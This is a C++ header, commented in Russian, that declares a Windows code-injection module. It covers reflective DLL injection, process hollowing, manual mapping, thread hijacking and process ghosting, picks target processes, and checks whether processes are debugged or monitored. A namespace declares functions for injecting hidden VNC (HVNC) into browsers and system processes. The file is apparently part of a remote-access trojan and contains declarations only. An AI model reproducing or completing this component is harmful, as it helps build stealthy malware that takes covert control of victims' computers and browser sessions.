#pragma once

#include <windows.h>
#include <memory>
#include <vector>
#include <string>
#include <map>
#include "../logger/file_logger.h"

// Типы инъекций
enum class InjectionType {
    REFLECTIVE_DLL = 1,
    PROCESS_HOLLOWING = 2,
    MANUAL_MAP = 3,
    THREAD_HIJACKING = 4,
    ATOM_BOMBING = 5,
    PROCESS_GHOSTING = 6
};

// Результат инъекции
struct InjectionResult {
    bool success;
    DWORD processId;
    HANDLE processHandle;
    HANDLE threadHandle;
    LPVOID baseAddress;
    SIZE_T imageSize;
    std::string errorMessage;
    
    InjectionResult() : success(false), processId(0), processHandle(NULL), 
                       threadHandle(NULL), baseAddress(nullptr), imageSize(0) {}
};

// Информация о целевом процессе
struct TargetProcess {
    std::string name;
    std::string path;
    DWORD processId;
    bool isWow64;
    DWORD sessionId;
    int priority; // Приоритет для выбора (чем выше, тем лучше)
    
    TargetProcess(const std::string& n, int p = 0) 
        : name(n), processId(0), isWow64(false), sessionId(0), priority(p) {}
};

// PE информация для инъекции
struct PEInfo {
    std::vector<uint8_t> rawData;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    std::vector<PIMAGE_SECTION_HEADER> sections;
    SIZE_T imageSize;
    DWORD entryPoint;
    bool is64Bit;
    
    PEInfo() : dosHeader(nullptr), ntHeaders(nullptr), imageSize(0), 
               entryPoint(0), is64Bit(false) {}
};

class CodeInjector {
private:
    // Список предпочитаемых процессов для инъекции
    std::vector<TargetProcess> targetProcesses_;
    
    // Кэш найденных процессов
    std::map<std::string, std::vector<DWORD>> processCache_;
    DWORD lastCacheUpdate_;
    
    // Счётчики использования
    std::map<DWORD, int> processUsageCount_;

public:
    CodeInjector();
    ~CodeInjector();
    
    // Основные методы инъекции
    InjectionResult InjectIntoProcess(const std::vector<uint8_t>& payload, 
                                     InjectionType type = InjectionType::REFLECTIVE_DLL,
                                     const std::string& targetProcess = "");
    
    InjectionResult ReflectiveDLLInjection(const std::vector<uint8_t>& dllData, 
                                          DWORD targetPID);
    
    InjectionResult ProcessHollowing(const std::vector<uint8_t>& payload,
                                    const std::string& targetPath);
    
    InjectionResult ManualMapInjection(const std::vector<uint8_t>& dllData,
                                      DWORD targetPID);
    
    InjectionResult ThreadHijacking(const std::vector<uint8_t>& shellcode,
                                   DWORD targetPID);
    
    // Выбор целевого процесса
    DWORD FindBestTargetProcess(const std::string& preferredName = "");
    std::vector<DWORD> FindProcessesByName(const std::string& processName);
    bool IsProcessSuitable(DWORD processId);
    void UpdateProcessCache();
    
    // PE обработка
    bool ParsePE(const std::vector<uint8_t>& data, PEInfo& peInfo);
    bool FixImports(LPVOID baseAddress, const PEInfo& peInfo, HANDLE targetProcess);
    bool ApplyRelocations(LPVOID baseAddress, const PEInfo& peInfo, LPVOID preferredBase);
    
    // Утилиты
    bool EnableDebugPrivilege();
    bool Is64BitProcess(DWORD processId);
    std::string GetProcessPath(DWORD processId);
    bool IsProcessInSameSession(DWORD processId);
    
private:
    // Внутренние методы для Reflective DLL
    LPVOID FindReflectiveLoader(const std::vector<uint8_t>& dllData);
    bool InjectDLLAndExecute(HANDLE targetProcess, const std::vector<uint8_t>& dllData);
    
    // Внутренние методы для Process Hollowing
    bool CreateSuspendedProcess(const std::string& targetPath, PROCESS_INFORMATION& pi);
    bool UnmapTargetImage(HANDLE targetProcess, LPVOID baseAddress);
    bool MapPayloadToTarget(HANDLE targetProcess, const std::vector<uint8_t>& payload, 
                           LPVOID targetBase, PEInfo& peInfo);
    bool PatchEntryPoint(HANDLE targetProcess, HANDLE targetThread, 
                        LPVOID baseAddress, DWORD entryPoint);
    
    // Внутренние методы для Manual Map
    bool AllocateImageMemory(HANDLE targetProcess, const PEInfo& peInfo, LPVOID& baseAddress);
    bool CopySections(HANDLE targetProcess, LPVOID baseAddress, const PEInfo& peInfo);
    bool ExecuteInTarget(HANDLE targetProcess, LPVOID entryPoint);
    
    // Вспомогательные функции
    void LogInjectionAttempt(InjectionType type, DWORD targetPID, bool success);
    std::string InjectionTypeToString(InjectionType type);
};

// Глобальный инжектор
extern std::unique_ptr<CodeInjector> g_codeInjector;

// Утилиты для работы с процессами
namespace ProcessUtils {
    std::vector<DWORD> EnumerateProcesses();
    std::string GetProcessName(DWORD processId);
    std::string GetProcessImagePath(DWORD processId);
    bool IsProcessElevated(DWORD processId);
    bool IsSystemProcess(DWORD processId);
    DWORD GetProcessSessionId(DWORD processId);
    
    // Проверки безопасности
    bool IsProcessSuspicious(DWORD processId);
    bool IsProcessDebugged(DWORD processId);
    bool IsProcessMonitored(DWORD processId);
}

// Специализированные инъекторы для HVNC
namespace HVNCInjection {
    // Инъекция HVNC в браузер
    InjectionResult InjectHVNCIntoBrowser(const std::string& browserPath = "");
    
    // Инъекция в системный процесс
    InjectionResult InjectHVNCIntoSystemProcess();
    
    // Инъекция в существующий процесс
    InjectionResult InjectHVNCIntoExistingProcess(DWORD targetPID);
    
    // Создание скрытого процесса с HVNC
    InjectionResult CreateHiddenHVNCProcess();
}